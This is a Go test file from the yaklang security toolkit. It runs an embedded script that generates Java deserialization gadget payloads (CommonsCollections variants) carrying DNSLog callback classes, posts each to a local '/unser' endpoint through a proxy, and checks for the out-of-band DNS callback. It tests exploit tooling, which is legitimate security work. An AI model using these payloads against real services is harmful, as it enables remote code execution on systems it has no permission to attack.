package yaktest

import (
	"context"
	"github.com/yaklang/yaklang/common/yak/yaklang"
	"testing"
)

var ysoTestCode = `
templateGadgetNames = ["CommonsCollections2","CommonsCollections3","CommonsCollections4","CommonsCollections8"]
for gadgetName in templateGadgetNames{
	domain,token = risk.NewDNSLogDomain()~
	gadgetIns = yso.GetGadget(gadgetName,yso.useDNSLogEvilClass(domain))~
    payload,err = yso.ToBytes(gadgetIns)
    rsp,req = poc.HTTP("GET /unser HTTP/1.1\nHost: 127.0.0.1:8081\n\n"+string(payload),poc.proxy("http://127.0.0.1:8084"))~
    res = risk.CheckDNSLogByToken(token,3)~
    if res.Len() == 0{
        panic("test %s dnslog failed" % gadgetName)
    }
	log.info("gadget %s dnslog test success" % gadgetName)
}
`

func TestName(t *testing.T) {
	err := yaklang.New().SafeEval(context.Background(), ysoTestCode)
	if err != nil {
		t.Fatal(err)
	}
}
